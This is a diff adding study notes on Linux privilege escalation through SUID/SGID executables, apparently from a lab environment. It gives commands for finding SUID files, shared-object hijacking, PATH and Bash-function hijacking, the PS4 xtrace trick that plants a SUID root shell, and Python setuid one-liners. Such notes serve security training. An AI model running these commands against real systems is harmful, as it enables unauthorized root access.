@@ -239,3 +239,149 @@ sudo LD_LIBRARY_PATH=/tmp apache2
 ```
 
 </div></div>
+
+## SUID-SGID executables scaling
+- https://gtfobins.github.io/
+- [[Operative System/Linux/Permisos/SUID\|SUID]] [[Operative System/Linux/Permisos/SGID\|SGID]]
+Check files with SUID or SGID permission
+```shell
+find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
+```
+Check files with SUID permision
+```shell
+find / -perm -u=s -type f -ls 2>/dev/null
+```
+Check files with SUID permision
+```shell
+find / -perm -g=s -type f -ls 2>/dev/null
+```
+### 
+<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
+
+
+
+- Find a known exploit. [Exploit-DB](https://www.exploit-db.com/), Google, and GitHub are good places to search!
+
+|             |                      |
+| ----------- | -------------------- |
+| exim-4.84-3 | [[cve-2016-1531.sh\|cve-2016-1531.sh]] |
+
+
+</div></div>
+
+### 
+<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
+
+
+
+- If we have a executable
+- Search if is trying to load shared objects, but it cannot be found.
+```shell
+strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
+  ```
+
+- like this
+`open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)`
+
+- Create the **.config** directory for the libcalc.so file:
+```sh
+mkdir /home/user/.config
+```
+- **Compile** the code [[libcalc.c\|libcalc.c]] (It **simply spawns a Bash shell.**) into a shared object at the location the **suid-so** executable was looking for it:
+```shell
+gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
+```
+- Run again
+`/usr/local/bin/suid-so`
+
+strace /usr/bin/mount 2>&1 | grep -iE "open|access|no such file"
+
+</div></div>
+
+### 
+<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
+
+
+
+- If an executable can be exploited due to it inheriting the user's PATH and attempting to execute programs without specifying an absolute path.
+- In this example the executable is trying to start an apache2 webserver
+- Use `string` to look for string in the file.
+```shell
+strings /usr/local/bin/suid-env
+```
+- One line ("service apache2 start") suggests that the service executable is being called to start the webserver, however **the full path** of the executable (/usr/sbin/service) **is not being used**.
+- Compile the code (spawn a bash shell) [[service.c\|service.c]] into an executable.
+```shell
+gcc -o service /home/user/tools/suid/service.c
+```
+- Or like an e.g. copy the shell file as a executable
+```shell
+echo /bin/bash > file_to_execute
+```
+- Change the PATH [[PATH exploiting\|PATH exploiting]]
+```shell
+export PATH=/path_to_executable:$PATH
+```
+
+</div></div>
+
+### 
+<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
+
+
+
+## Bash versions <4.2-048
+- Define shell **functions** with **names** that **resemble** file paths
+- - then **export** those functions so that they are used **instead** of any actual **executable** at that file **path**.
+- If we have an executable `strings /usr/local/bin/suid-env2`
+`strings /usr/local/bin/suid-env2`
+`/usr/sbin/service apache2 start`
+- Create a Bash function with the name "/usr/sbin/service" that executes a new Bash shell (using -p so permissions are preserved)
+```shell
+function /usr/sbin/service { /bin/bash -p; }
+```
+- export the function:
+```shell
+export -f /usr/sbin/service
+```
+- Run the executable
+## Bash <4.4
+-  If we have an executable 
+- In debugging mode, Bash uses the environment variable **PS4** to display an extra prompt for debugging statements.
+- Run the executable with bash debugging enabled and the PS4 variable set to an embedded command which creates an SUID version of /bin/bash:
+```shell
+env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
+```
+- Run the /tmp/rootbash executable with -p to gain a shell running with root privileges:
+```shell
+/tmp/rootbash -p
+```
+
+</div></div>
+
+
+### 
+<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
+
+
+
+set to root
+```shell
+python3 -c 'import os; os.setuid(0); os.system("whoami")'
+```
+
+set to root and open a bash 
+```shell
+python3 -c 'import os; os.setuid(0); os.system("whoami"); os.system("bash")'
+```
+
+Option to show the results
+```python
+import os; print(os.popen("ls -l").read())
+```
+
+subproccess.run([comando])
+
+with sys module too
+
+</div></div>
